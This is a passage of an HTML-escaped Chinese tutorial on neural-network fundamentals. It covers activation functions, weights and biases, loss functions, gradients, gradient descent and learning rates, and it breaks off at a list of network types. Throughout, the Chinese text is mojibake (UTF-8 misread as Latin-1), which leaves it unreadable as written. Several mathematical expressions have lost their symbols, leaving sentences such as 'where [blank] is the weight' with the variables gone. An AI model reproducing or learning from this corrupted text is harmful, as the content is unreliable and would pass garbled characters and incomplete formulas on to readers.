&lt;li>ç¥ç»å…ƒçš„è¾“å‡ºä¸ä»…ä»…æ˜¯å…¶è¾“å…¥çš„çº¿æ€§ç»„åˆã€‚è¾“å…¥çš„åŠ æƒå’Œé€šå¸¸ä¼šé€šè¿‡ä¸€ä¸ªéçº¿æ€§å‡½æ•°ï¼Œå³æ¿€æ´»å‡½æ•°ï¼Œå¦‚Sigmoidã€ReLUæˆ–tanhç­‰ã€‚&lt;/li>
&lt;li>è¿™ä¸ªæ¿€æ´»å‡½æ•°ä½¿å¾—ç¥ç»ç½‘ç»œèƒ½å¤Ÿæ•æ‰å’Œå­¦ä¹ å¤æ‚çš„éçº¿æ€§å…³ç³»ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æƒé‡å’Œåå·®&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æƒé‡ï¼ˆWeightsï¼‰å†³å®šäº†è¾“å…¥ä¿¡å·åœ¨å½±å“è¾“å‡ºæ—¶çš„å¼ºåº¦å’Œé‡è¦æ€§ã€‚æ¯ä¸ªè¾“å…¥éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æƒé‡ã€‚&lt;/li>
&lt;li>åå·®ï¼ˆBiasï¼‰æ˜¯åŠ åˆ°åŠ æƒå’Œä¸Šçš„ä¸€ä¸ªå¸¸æ•°ï¼Œå®ƒæä¾›äº†é¢å¤–çš„è‡ªç”±åº¦ï¼Œä½¿å¾—ç¥ç»å…ƒå³ä½¿åœ¨æ‰€æœ‰è¾“å…¥éƒ½æ˜¯é›¶æ—¶ä¹Ÿèƒ½æœ‰éé›¶çš„è¾“å‡ºã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ•°å­¦è¡¨ç¤º&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ä»æ•°å­¦çš„è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªç¥ç»å…ƒçš„æ“ä½œå¯ä»¥è¡¨ç¤ºä¸ºï¼Œå…¶ä¸­ æ˜¯æƒé‡ï¼Œ æ˜¯è¾“å…¥ï¼Œ æ˜¯åå·®ï¼Œ æ˜¯æ¿€æ´»å‡½æ•°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å‡½æ•°çš„è§’è‰²&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨è¿™ä¸ªæ¡†æ¶ä¸‹ï¼Œæƒé‡å’Œåå·®ç±»ä¼¼äºå‡½æ•°æ–¹ç¨‹çš„ç³»æ•°å’Œå¸¸é‡ï¼Œå®ƒä»¬è°ƒèŠ‚è¾“å…¥å¦‚ä½•å½±å“è¾“å‡ºã€‚&lt;/li>
&lt;li>ç¥ç»ç½‘ç»œé€šè¿‡å­¦ä¹ è¿™äº›æƒé‡å’Œåå·®çš„æœ€ä½³å€¼æ¥æ‹Ÿåˆå’Œé¢„æµ‹æ•°æ®ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>å› æ­¤ï¼Œå¯ä»¥å°†ç¥ç»å…ƒè§†ä¸ºä¸€ä¸ªé€šè¿‡æƒé‡å’Œåå·®è°ƒæ•´å…¶è¾“å…¥çš„å‡½æ•°ï¼Œé€šè¿‡æ¿€æ´»å‡½æ•°å¼•å…¥éçº¿æ€§ï¼Œä½¿å¾—æ•´ä¸ªç½‘ç»œèƒ½å¤Ÿå­¦ä¹ å’Œæ¨¡æ‹Ÿå¤æ‚çš„æ•°æ®å…³ç³»å’Œæ¨¡å¼ã€‚&lt;/p>
&lt;h2 id="æŸå¤±å‡½æ•°">æŸå¤±å‡½æ•°&lt;/h2>
&lt;p>æŸå¤±å‡½æ•°åœ¨æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ ä¸­æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨æ¥è¡¡é‡æ¨¡å‹æ€§èƒ½çš„å‡½æ•°ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¨¡å‹é¢„æµ‹å’Œå®é™…æ•°æ®ä¹‹é—´çš„å·®å¼‚ã€‚ä»¥ä¸‹æ˜¯æŸå¤±å‡½æ•°çš„ä¸€äº›å…³é”®ç‰¹ç‚¹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>å®šä¹‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æŸå¤±å‡½æ•°ï¼Œæœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºä»£ä»·å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªè¡¡é‡å•ä¸ªæ ·æœ¬é¢„æµ‹é”™è¯¯çš„åº¦é‡ã€‚åœ¨ç»™å®šè¾“å…¥å’Œæ¨¡å‹çš„æƒ…å†µä¸‹ï¼ŒæŸå¤±å‡½æ•°è¾“å‡ºä¸€ä¸ªæ•°å€¼ï¼Œè¿™ä¸ªæ•°å€¼è¡¨ç¤ºé¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®è·ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç›®çš„&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æŸå¤±å‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯æŒ‡å¯¼æ¨¡å‹çš„å­¦ä¹ ã€‚æ¨¡å‹è®­ç»ƒçš„ç›®æ ‡æ˜¯æœ€å°åŒ–æŸå¤±å‡½æ•°ï¼Œå³å‡å°‘é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¸¸è§ç±»å‹&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰&lt;/strong>: åœ¨å›å½’é—®é¢˜ä¸­å¸¸ç”¨ï¼Œè®¡ç®—é¢„æµ‹å€¼å’Œå®é™…å€¼ä¹‹å·®çš„å¹³æ–¹çš„å¹³å‡å€¼ã€‚&lt;/li>
&lt;li>&lt;strong>äº¤å‰ç†µæŸå¤±&lt;/strong>: åœ¨åˆ†ç±»é—®é¢˜ä¸­å¸¸ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨äºŒåˆ†ç±»æˆ–å¤šåˆ†ç±»é—®é¢˜ä¸­ã€‚å®ƒè¡¡é‡çš„æ˜¯æ¨¡å‹é¢„æµ‹çš„æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>åœ¨ç¥ç»ç½‘ç»œä¸­çš„ä½œç”¨&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨ç¥ç»ç½‘ç»œè®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°å¹¶ä½¿ç”¨è¯¸å¦‚æ¢¯åº¦ä¸‹é™ä¹‹ç±»çš„ä¼˜åŒ–ç®—æ³•æ¥è°ƒæ•´ç½‘ç»œçš„æƒé‡ï¼Œä½¿å¾—æŸå¤±å‡½æ•°çš„å€¼æœ€å°åŒ–ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>é€‰æ‹©æŸå¤±å‡½æ•°&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>é€‰æ‹©å“ªç§æŸå¤±å‡½æ•°å–å†³äºç‰¹å®šçš„æœºå™¨å­¦ä¹ ä»»åŠ¡ï¼ˆå¦‚å›å½’ã€åˆ†ç±»ã€èšç±»ç­‰ï¼‰å’Œæ•°æ®ç‰¹æ€§ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æŸå¤±å‡½æ•°æ˜¯è¿æ¥æ¨¡å‹é¢„æµ‹å’ŒçœŸå®æ•°æ®çš„æ¡¥æ¢ï¼Œå®ƒæä¾›äº†ä¸€ç§é‡åŒ–æ¨¡å‹æ€§èƒ½çš„æ–¹å¼ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°å­¦æ–¹æ³•æ¥ä¼˜åŒ–æ¨¡å‹ã€‚&lt;/p>
&lt;h2 id="æ¢¯åº¦">æ¢¯åº¦&lt;/h2>
&lt;p>åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œæ¢¯åº¦æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µã€‚ä¸‹é¢æ˜¯å¯¹æ¢¯åº¦åŠå…¶åœ¨ç¥ç»ç½‘ç»œä¸­ä½œç”¨çš„è§£é‡Šï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>æ¢¯åº¦çš„å«ä¹‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨æ•°å­¦å’Œç‰©ç†å­¦ä¸­ï¼Œæ¢¯åº¦é€šå¸¸æŒ‡çš„æ˜¯ä¸€ä¸ªå‡½æ•°åœ¨æ¯ä¸ªç‚¹ä¸Šçš„æ–œç‡æˆ–å˜åŒ–ç‡ã€‚åœ¨å¤šç»´ç©ºé—´ä¸­ï¼Œå®ƒè¡¨ç¤ºè¯¥å‡½æ•°åœ¨æ¯ä¸ªæ–¹å‘ä¸Šçš„æ–œç‡ã€‚&lt;/li>
&lt;li>åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œæ¢¯åº¦é€šå¸¸æŒ‡ä»£æŸå¤±å‡½æ•°ï¼ˆæˆ–ç›®æ ‡å‡½æ•°ï¼‰å…³äºç½‘ç»œå‚æ•°ï¼ˆå¦‚æƒé‡å’Œåå·®ï¼‰çš„åå¯¼æ•°ã€‚å®ƒè¡¨æ˜äº†æŸå¤±å‡½æ•°åœ¨å‚æ•°ç©ºé—´çš„æ¯ä¸ªç»´åº¦ä¸Šå¢åŠ æˆ–å‡å°‘çš„é€Ÿç‡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¢¯åº¦åœ¨ç¥ç»ç½‘ç»œä¸­çš„ä½œç”¨&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ¢¯åº¦ç”¨äºä¼˜åŒ–ç¥ç»ç½‘ç»œçš„å‚æ•°ã€‚é€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªå‚æ•°çš„æ¢¯åº¦ï¼Œç¥ç»ç½‘ç»œå¯ä»¥äº†è§£å¦‚ä½•è°ƒæ•´å…¶å‚æ•°ä»¥å‡å°‘æ€»æŸå¤±ã€‚&lt;/li>
&lt;li>è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªè¿‡ç¨‹ç§°ä¸ºæ¢¯åº¦ä¸‹é™æ¥å®Œæˆï¼Œå…¶ä¸­å‚æ•°æ²¿ç€æ¢¯åº¦çš„åæ–¹å‘è°ƒæ•´ï¼Œä»¥å‡å°‘æŸå¤±å‡½æ•°çš„å€¼ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="å¯¼æ•°åå¯¼æ•°å’Œæ¢¯åº¦">å¯¼æ•°ã€åå¯¼æ•°å’Œæ¢¯åº¦&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>å¯¼æ•°ï¼ˆDerivativeï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å¯¼æ•°æ˜¯ä¸€ä¸ªå•å˜é‡å‡½æ•°åœ¨æŸä¸€ç‚¹ä¸Šçš„ç¬æ—¶å˜åŒ–ç‡ã€‚å®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œå½“è¾“å…¥å˜é‡å‘ç”Ÿéå¸¸å°çš„å˜åŒ–æ—¶ï¼Œå‡½æ•°å€¼å°†å¦‚ä½•å˜åŒ–ã€‚&lt;/li>
&lt;li>åœ¨æ•°å­¦ä¸Šï¼Œå¦‚æœæœ‰ä¸€ä¸ªå‡½æ•° f(x)ï¼Œé‚£ä¹ˆåœ¨ç‚¹ x çš„å¯¼æ•° fâ€²(x) è¡¨ç¤ºå½“ x å‘ç”Ÿå¾®å°å˜åŒ–æ—¶ï¼Œf(x) çš„å˜åŒ–é‡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>åå¯¼æ•°ï¼ˆPartial Derivativeï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åå¯¼æ•°æ˜¯å¤šå˜é‡å‡½æ•°å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡çš„å¯¼æ•°ï¼ŒåŒæ—¶å‡è®¾å…¶ä»–å˜é‡ä¿æŒä¸å˜ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå‡½æ•° f(x,y)ï¼Œå¯¹ x çš„åå¯¼æ•° è¡¨ç¤ºå½“ x å‘ç”Ÿå¾®å°å˜åŒ–è€Œ y ä¿æŒä¸å˜æ—¶ï¼Œå‡½æ•°å€¼çš„å˜åŒ–ç‡ã€‚&lt;/li>
&lt;li>åå¯¼æ•°æè¿°çš„æ˜¯åœ¨å¤šç»´ç©ºé—´ä¸­ï¼Œå‡½æ•°æ²¿ç€æŸä¸€ä¸ªåæ ‡è½´çš„å˜åŒ–ç‡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¢¯åº¦ï¼ˆGradientï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ¢¯åº¦æ˜¯å¯¼æ•°åœ¨å¤šç»´ç©ºé—´ä¸­çš„æ¨å¹¿ã€‚å®ƒä¸æ˜¯é’ˆå¯¹å•ä¸€å˜é‡ï¼Œè€Œæ˜¯é’ˆå¯¹å¤šå˜é‡å‡½æ•°çš„æ¯ä¸ªç‹¬ç«‹å˜é‡çš„åå¯¼æ•°çš„é›†åˆã€‚&lt;/li>
&lt;li>åœ¨æ•°å­¦ä¸Šï¼Œå¯¹äºå¤šå˜é‡å‡½æ•° f(x,y,z,&amp;hellip;)ï¼Œæ¢¯åº¦æ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…¶æ¯ä¸ªåˆ†é‡éƒ½æ˜¯å¯¹åº”äºä¸€ä¸ªå˜é‡çš„åå¯¼æ•°ã€‚æ¢¯åº¦æŒ‡å‘å‡½æ•°å¢é•¿æœ€å¿«çš„æ–¹å‘ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>åŒºåˆ«&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>ç»´åº¦&lt;/strong>: å¯¼æ•°æ˜¯ä¸€ç»´çš„ï¼Œè€Œæ¢¯åº¦æ˜¯å¤šç»´çš„ã€‚&lt;/li>
&lt;li>&lt;strong>æ–¹å‘&lt;/strong>: å¯¼æ•°åªæœ‰å¤§å°ï¼Œæ²¡æœ‰æ–¹å‘ï¼ˆæˆ–è€…å¯ä»¥è¯´æ˜¯æ­£æˆ–è´Ÿçš„æ–¹å‘ï¼‰ï¼Œè€Œæ¢¯åº¦æ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…·æœ‰å¤§å°å’Œæ–¹å‘ã€‚&lt;/li>
&lt;li>&lt;strong>åº”ç”¨&lt;/strong>: åœ¨å•å˜é‡å‡½æ•°çš„æƒ…å¢ƒä¸­ä½¿ç”¨å¯¼æ•°ï¼Œè€Œåœ¨å¤šå˜é‡å‡½æ•°çš„æƒ…å¢ƒä¸­ä½¿ç”¨æ¢¯åº¦ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>åœ¨ç¥ç»ç½‘ç»œçš„èƒŒæ™¯ä¸‹ï¼Œè€ƒè™‘åˆ°ç½‘ç»œå‚æ•°é€šå¸¸æ˜¯å¤šç»´çš„ï¼ˆä¾‹å¦‚æƒé‡çŸ©é˜µï¼‰ï¼Œå› æ­¤æ›´å¤šåœ°ä½¿ç”¨æ¢¯åº¦è€Œä¸æ˜¯å•ä¸€çš„å¯¼æ•°ã€‚æ¢¯åº¦æŒ‡æ˜äº†åœ¨å‚æ•°ç©ºé—´ä¸­å‡å°‘æŸå¤±å‡½æ•°çš„æœ€å¿«è·¯å¾„ã€‚&lt;/p>
&lt;h2 id="æ¢¯åº¦ä¸‹é™gradient-descent">æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰&lt;/h2>
&lt;p>æ¢¯åº¦ä¸‹é™ç®—æ³•æ˜¯ä¸€ç§ç”¨äºä¼˜åŒ–ç¥ç»ç½‘ç»œå‚æ•°çš„æ–¹æ³•ï¼Œå…¶ç›®çš„æ˜¯æœ€å°åŒ–æŸå¤±å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ¯”å–»æ¥ç†è§£æ¢¯åº¦ä¸‹é™ï¼š&lt;/p>
&lt;p>æƒ³è±¡ä½ åœ¨ä¸€ä¸ªå±±çš„é¡¶éƒ¨ï¼Œç›®æ ‡æ˜¯åˆ°è¾¾å±±è°·ï¼ˆè¿™é‡Œçš„å±±è°·ä»£è¡¨æŸå¤±å‡½æ•°çš„æœ€å°å€¼ï¼‰ã€‚ä½†æ˜¯ï¼Œä½ çš„çœ¼ç›è¢«è’™ä½äº†ï¼Œçœ‹ä¸åˆ°å‘¨å›´çš„ç¯å¢ƒã€‚ä½ åªèƒ½é€šè¿‡æ„Ÿè§‰è„šä¸‹çš„å¡åº¦ï¼ˆè¿™å°±åƒæ˜¯æ¢¯åº¦ï¼‰æ¥åˆ¤æ–­å“ªä¸ªæ–¹å‘æ˜¯ä¸‹å¡ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>æ£€æŸ¥å¡åº¦ï¼ˆè®¡ç®—æ¢¯åº¦ï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œä½ é¦–å…ˆè®¡ç®—æŸå¤±å‡½æ•°åœ¨å½“å‰ä½ç½®ï¼ˆå³å½“å‰å‚æ•°å€¼ï¼‰çš„æ¢¯åº¦ã€‚æ¢¯åº¦å‘Šè¯‰ä½ æŸå¤±å‡½æ•°ä¸Šå‡å’Œä¸‹é™æœ€å¿«çš„æ–¹å‘ã€‚åœ¨æˆ‘ä»¬çš„æ¯”å–»ä¸­ï¼Œè¿™å°±åƒæ˜¯æ„Ÿè§‰è„šä¸‹åœ°é¢çš„å¡åº¦ï¼Œäº†è§£å“ªä¸ªæ–¹å‘æ˜¯ä¸‹å¡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è¿ˆå‡ºä¸€æ­¥ï¼ˆæ›´æ–°å‚æ•°ï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ¥ä¸‹æ¥ï¼Œä½ ä¼šæœç€æ¢¯åº¦ä¸‹é™æœ€å¿«çš„æ–¹å‘è¿ˆå‡ºä¸€æ­¥ã€‚è¿™ä¸€æ­¥çš„å¤§å°ç§°ä¸ºå­¦ä¹ ç‡ã€‚åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œè¿™æ„å‘³ç€ä½ ä¼šæ ¹æ®æ¢¯åº¦å’Œå­¦ä¹ ç‡æ¥è°ƒæ•´ç½‘ç»œçš„æƒé‡å’Œåå·®ã€‚&lt;/li>
&lt;li>å­¦ä¹ ç‡å¾ˆé‡è¦ï¼šå¦‚æœå¤ªå¤§ï¼Œä½ å¯èƒ½ä¼šè·¨è¿‡å±±è°·ï¼Œé”™è¿‡æœ€ä½ç‚¹ï¼›å¦‚æœå¤ªå°ï¼Œä½ åˆ™éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½åˆ°è¾¾å±±è°·ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>é‡å¤è¿‡ç¨‹&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œæ¯æ¬¡éƒ½æ ¹æ®æŸå¤±å‡½æ•°çš„æ¢¯åº¦æ¥æ›´æ–°ä½ çš„ä½ç½®ï¼ˆå³ç¥ç»ç½‘ç»œçš„å‚æ•°ï¼‰ï¼Œç›´åˆ°ä½ æ„Ÿè§‰åˆ°è‡ªå·±å·²ç»åˆ°è¾¾äº†å±±è°·ï¼ˆå³æŸå¤±å‡½æ•°ä¸å†æ˜¾è‘—ä¸‹é™ï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æ€»çš„æ¥è¯´ï¼Œæ¢¯åº¦ä¸‹é™æ˜¯ä¸€ä¸ªè¿­ä»£è¿‡ç¨‹ï¼Œå®ƒé€šè¿‡ä¸æ–­åœ°è®¡ç®—æ¢¯åº¦å¹¶æ›´æ–°å‚æ•°ï¼Œæ¥å¸®åŠ©ç¥ç»ç½‘ç»œæ‰¾åˆ°æŸå¤±å‡½æ•°çš„æœ€å°å€¼ã€‚è¿™ä¸ªè¿‡ç¨‹å°±åƒæ˜¯åœ¨ç›²ç›®ä¸­æ‰¾åˆ°ä¸€æ¡é€šå¾€å±±è°·çš„è·¯å¾„ã€‚&lt;/p>
&lt;h3 id="æˆæœ¬è¡¨é¢å’Œç­‰å€¼çº¿å›¾cost-surface--contour-plot">æˆæœ¬è¡¨é¢å’Œç­‰å€¼çº¿å›¾ï¼ˆCost Surface &amp;amp; Contour Plotï¼‰&lt;/h3>
&lt;ul>
&lt;li>é«˜åº¦ä»£è¡¨æˆæœ¬&lt;/li>
&lt;li>å…¶ä½™ä¸¤ä¸ªè½´åˆ†åˆ«ä¸ºæƒé‡ &lt;strong>w&lt;/strong>eightã€åå·® &lt;strong>b&lt;/strong>ias&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/a800519e-361a-4f5f-964e-3ddf81927d6e/Untitled.png" alt="">&lt;/p>
&lt;p>è¿™ä¸¤å¼ å›¾æœ‰åŠ©äºç†è§£æ¢¯åº¦ä¸‹é™ç®—æ³•ã€‚&lt;/p>
&lt;p>ä¸Šå›¾ä¸­çš„ï¼ˆæŸå¤±å‡½æ•°ï¼‰æ˜¯å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰ï¼Œå³ï¼š \(l(w,b)=\frac{1}{N}\sum_{n=1}^N(y_n-(wx_n+b))^2\)&lt;/p>
&lt;p>å­¦ä¹ ï¼ˆè®­ç»ƒï¼‰çš„ç›®æ ‡ï¼Œå°±æ˜¯æ‰¾åˆ°è®©è¿™ä¸ªå‡½æ•°çš„å‡½æ•°å€¼æœ€å°çš„ w å’Œ bã€‚&lt;/p>
&lt;h3 id="å¦‚ä½•æ ¹æ®æŸå¤±å‡½æ•°çš„æ¢¯åº¦å­¦ä¹ ç‡æ›´æ–°æƒé‡">å¦‚ä½•æ ¹æ®æŸå¤±å‡½æ•°çš„æ¢¯åº¦ã€å­¦ä¹ ç‡æ›´æ–°æƒé‡&lt;/h3>
&lt;p>åœ¨æ·±åº¦å­¦ä¹ ä¸­ï¼Œä½¿ç”¨æ¢¯åº¦æ¥æ›´æ–°æƒé‡æ˜¯ä¼˜åŒ–æ¨¡å‹çš„å…³é”®æ­¥éª¤ï¼Œè¿™é€šå¸¸åœ¨åå‘ä¼ æ’­è¿‡ç¨‹ä¸­è¿›è¡Œã€‚æ¢¯åº¦æœ¬è´¨ä¸Šæ˜¯æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¨¡å‹æƒé‡çš„åå¯¼æ•°ï¼Œå®ƒæŒ‡ç¤ºäº†æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªæƒé‡å¢åŠ æˆ–å‡å°‘çš„æ–¹å‘å’Œå¹…åº¦ã€‚é€šè¿‡æ¢¯åº¦ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚ä½•è°ƒæ•´æƒé‡ä»¥å‡å°‘æŸå¤±ã€‚&lt;/p>
&lt;p>æƒé‡æ›´æ–°çš„åŸºæœ¬å…¬å¼å¦‚ä¸‹ï¼š \(W_{new}=W_{old}âˆ’Î·â‹…âˆ‡L(W_{old})\)&lt;/p>
&lt;p>å…¶ä¸­ï¼š&lt;/p>
&lt;ul>
&lt;li>æ˜¯æ›´æ–°åçš„æƒé‡ã€‚&lt;/li>
&lt;li>æ˜¯å½“å‰çš„æƒé‡ã€‚&lt;/li>
&lt;li>Î· æ˜¯å­¦ä¹ ç‡ã€‚&lt;/li>
&lt;li>æ˜¯æŸå¤±å‡½æ•°ç›¸å¯¹äºå½“å‰æƒé‡çš„æ¢¯åº¦ã€‚&lt;/li>
&lt;/ul>
&lt;p>æ¢¯åº¦çš„ä½œç”¨å¯ä»¥è¿™æ ·ç†è§£ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>æ–¹å‘&lt;/strong>ï¼šæ¢¯åº¦çš„æ–¹å‘æŒ‡å‘æŸå¤±å‡½æ•°å¢é•¿æœ€å¿«çš„æ–¹å‘ã€‚åœ¨ä¼˜åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å‡å°‘æŸå¤±ï¼Œå› æ­¤éœ€è¦å‘æ¢¯åº¦çš„ç›¸åæ–¹å‘æ›´æ–°æƒé‡ã€‚&lt;/li>
&lt;li>&lt;strong>å¹…åº¦&lt;/strong>ï¼šæ¢¯åº¦çš„å¹…åº¦ï¼ˆå¤§å°ï¼‰å‘Šè¯‰æˆ‘ä»¬åœ¨è¯¥æ–¹å‘ä¸ŠæŸå¤±å‡½æ•°å˜åŒ–çš„é€Ÿåº¦ã€‚å¦‚æœæ¢¯åº¦å¾ˆå¤§ï¼Œæ„å‘³ç€åœ¨é‚£ä¸ªæ–¹å‘ä¸ŠæŸå¤±å‡½æ•°å˜åŒ–å¾ˆå¿«ã€‚&lt;/li>
&lt;/ul>
&lt;p>å­¦ä¹ ç‡çš„ä½œç”¨ï¼š&lt;/p>
&lt;ul>
&lt;li>å­¦ä¹ ç‡å†³å®šäº†æˆ‘ä»¬åœ¨æ¢¯åº¦æŒ‡ç¤ºçš„æ–¹å‘ä¸Šç§»åŠ¨çš„æ­¥é•¿ã€‚è¾ƒé«˜çš„å­¦ä¹ ç‡æ„å‘³ç€æ›´å¤§çš„æ­¥é•¿ï¼Œå¯ä»¥åŠ å¿«å­¦ä¹ è¿‡ç¨‹ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´è¶…è¿‡æœ€ä¼˜ç‚¹ï¼Œç”šè‡³å¯¼è‡´æ¨¡å‹ä¸ç¨³å®šã€‚ç›¸åï¼Œè¾ƒä½çš„å­¦ä¹ ç‡æ„å‘³ç€æ›´å°çš„æ­¥é•¿ï¼Œå­¦ä¹ è¿‡ç¨‹æ›´ç¨³å®šï¼Œä½†è®­ç»ƒé€Ÿåº¦ä¼šå‡æ…¢ï¼Œä¸”å¯èƒ½é™·å…¥å±€éƒ¨æœ€å°å€¼ã€‚&lt;/li>
&lt;/ul>
&lt;p>å› æ­¤ï¼Œé€‰æ‹©åˆé€‚çš„å­¦ä¹ ç‡æ˜¯éå¸¸é‡è¦çš„ã€‚å¤ªé«˜æˆ–å¤ªä½çš„å­¦ä¹ ç‡éƒ½å¯èƒ½å¯¼è‡´è®­ç»ƒæ•ˆæœä¸ä½³ã€‚åœ¨å®è·µä¸­ï¼Œé€šå¸¸éœ€è¦é€šè¿‡å®éªŒæ¥ç¡®å®šæœ€ä½³çš„å­¦ä¹ ç‡ã€‚æ­¤å¤–ï¼Œä¹Ÿæœ‰ä¸€äº›è‡ªé€‚åº”å­¦ä¹ ç‡çš„ä¼˜åŒ–ç®—æ³•ï¼ˆå¦‚Adamã€RMSpropç­‰ï¼‰ï¼Œå®ƒä»¬å¯ä»¥åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è‡ªåŠ¨è°ƒæ•´å­¦ä¹ ç‡ï¼Œä»¥æé«˜è®­ç»ƒçš„æ•ˆæœå’Œç¨³å®šæ€§ã€‚&lt;/p>
&lt;h2 id="å¸¸è§çš„ç¥ç»ç½‘ç»œç±»å‹">å¸¸è§çš„ç¥ç»ç½‘ç»œç±»å‹&lt;/h2>
&lt;p>å¸¸è§çš„ç¥ç»ç½‘ç»œç±»å‹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>å…¨è¿æ¥ç¥ç»ç½‘ç»œï¼ˆFully Connected Networksï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ä¹Ÿè¢«ç§°ä¸ºå¯†é›†ç¥ç»ç½‘ç»œï¼Œæ˜¯æœ€åŸºæœ¬çš„ç¥ç»ç½‘ç»œå½¢å¼ã€‚åœ¨è¿™ç§ç½‘ç»œä¸­ï¼Œæ¯ä¸ªç¥ç»å…ƒä¸å‰ä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒç›¸è¿ã€‚&lt;/li>
&lt;li>é€‚ç”¨äºç»“æ„åŒ–æ•°æ®ï¼Œå¦‚è¡¨æ ¼æ•°æ®æˆ–ç®€å•çš„åˆ†ç±»ä»»åŠ¡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
